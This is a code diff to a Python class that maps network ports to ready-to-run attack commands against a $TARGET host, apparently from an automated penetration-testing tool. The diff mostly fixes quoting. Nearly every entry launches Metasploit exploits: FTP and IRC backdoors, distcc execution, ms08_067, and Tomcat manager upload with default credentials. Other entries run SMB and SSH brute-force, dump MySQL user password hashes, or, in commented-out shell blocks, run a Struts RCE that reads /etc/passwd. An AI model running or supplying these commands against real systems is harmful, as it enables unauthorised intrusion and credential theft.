@@ -2,22 +2,19 @@
 #  -*- coding: utf-8 -*-
 __author__ = 'xy'
 
-import os
-from os.path import exists
-
 
 class portExploits:
     PORTS = {
         21: ["nmap -sV -sC -p 21 --script=ftp-* $TARGET",
-             'msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;'],
+             'msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST $TARGET; setg RHOSTS $TARGET; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"'],
         22: ["nmap -sV -sC -T5 -p 22 --script=ssh-* $TARGET",
-             'msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$PWD"/BruteX/wordlists/simple-users.txt; setg RHOSTS "$TARGET"; setg "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;'],
+             'msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE $USER; setg RHOSTS $TARGET; setg $TARGET; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"'],
         23: ['cisco-torch -A $TARGET',
              'nmap -sV -T5 --script=telnet* -p 23 $TARGET',
-             'msfconsole -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"'],
+             'msfconsole -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS $TARGET; setg RHOST $TARGET; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"'],
         25: ['nmap -sV -T5 --script=smtp* -p 25 $TARGET',
              'smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET',
-             'msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;"'],
+             'msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS $TARGET; setg RHOST $TARGET; run; exit;"'],
         53: ['nmap -sV -T5 --script=dns* -p U:53,T:53 $TARGET'],
         79: ['nmap -sV -T5 --script=finger* -p 79 $TARGET',
              'bin/fingertool.sh $TARGET BruteX/wordlists/simple-users.txt'],
@@ -32,14 +29,14 @@ class portExploits:
               'nbtscan $TARGET',  # SMB="1"
               'nmap -sV -T5 -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET',
               'for a in `cat BruteX/wordlists/snmp-community-strings.txt`; do snmpwalk $TARGET -c $a; done;',
-              'msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"'],
+              'msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS $TARGET; setg RHOST $TARGET; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"'],
         162: ['nmap -p 162 --script=snmp* $TARGET'],
         389: ['nmap -p 389 -T5 --script=ldap* $TARGET'],
         445: ['enum4linux $TARGET',
               'python $SAMRDUMP $TARGET',
               'nbtscan $TARGET',
               'nmap -sV -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET',
-              'msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"'],
+              'msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS $TARGET; setg RHOST $TARGET; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"'],
         512: ['nmap -sV -T5 -p 512 --script=rexec* $TARGET'],
         513: ['map -sV -T5 -p 513 --script=rlogin* $TARGET'],
         514: ['amap $TARGET 514 -A'],
@@ -48,7 +45,7 @@ class portExploits:
                'showmount -e $TARGET',
                'smbclient -L $TARGET -U " "%" "'],
         2121: ['nmap -sV -T5 --script=ftp* -p 2121 $TARGET',
-               'msfconsole -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"'],
+               'msfconsole -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS $TARGET; setg RHOST $TARGET; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"'],
         3306: ['nmap -sV --script=mysql* -p 3306 $TARGET',
                "mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'"],
         3310: ['nmap -p 3310 -T5 -sV --script clamav-exec $TARGET'],
@@ -56,15 +53,15 @@ class portExploits:
         3389: ['map -sV -T5 --script=rdp-* -p 3389 $TARGET',
                'rdesktop $TARGET &'],
         3632: ['nmap -sV -T5 --script=distcc-* -p 3632 $TARGET',
-               'msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"'],
+               'msfconsole -x "setg RHOST $TARGET; setg RHOSTS $TARGET; setg RHOST $TARGET; use unix/misc/distcc_exec; run; exit;"'],
         5432: ['nmap -sV --script=pgsql-brute -p 5432 $TARGET'],
         5800: ['nmap -sV -T5 --script=vnc* -p 5800 $TARGET'],
         5900: ['nmap -sV -T5 --script=vnc* -p 5900 $TARGET'],
         6000: ['nmap -sV -T5 --script=x11* -p 6000 $TARGET'],
         6667: ['nmap -sV -T5 --script=irc* -p 6667 $TARGET',
-               'msfconsole -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"'],
+               'msfconsole -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST $TARGET; setg RHOSTS $TARGET; run; exit;"'],
         10000: [
-            'msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"'],
+            'msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST $TARGET; setg RHOSTS $TARGET; run; exit;"'],
         49152: ['$SUPER_MICRO_SCAN $TARGET']
 
     }
@@ -113,7 +110,7 @@ class portExploits:
     # 		echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
     # 		sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
     # 		echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
-    # 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+    # 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS $TARGET; setg RHOST $TARGET; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
     # 		echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
     # 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 80
     # 	fi
@@ -224,7 +221,7 @@ class portExploits:
     # 		echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
     # 		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
     # 		echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
-    # 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+    # 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS $TARGET; setg RHOST $TARGET; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
     # 		echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
     # 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 443 --ssl
     # 	fi
@@ -295,9 +292,9 @@ class portExploits:
     # 	nikto -h http://$TARGET:8080
     # 	cutycapt --url=http://$TARGET:8080 --out=loot/$TARGET-port8080.jpg
     # 	nmap -p 8080 -T5 --script=*proxy* $TARGET
-    # 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+    # 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS $TARGET; setg RHOST $TARGET; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
     # 	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
-    # 	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
+    # 	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS $TARGET; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
     # 	python jexboss/jexboss.py http://$TARGET:8080
     # 	python jexboss/jexboss.py https://$TARGET:8080
     # fi
@@ -327,7 +324,7 @@ class portExploits:
     # 	nmap -p 8180 -T5 --script=*proxy* $TARGET
     # 	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
     # 	echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
-    # 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+    # 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS $TARGET; setg RHOST $TARGET; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
     # fi
     #
     # if [ -z "$port_8443" ];
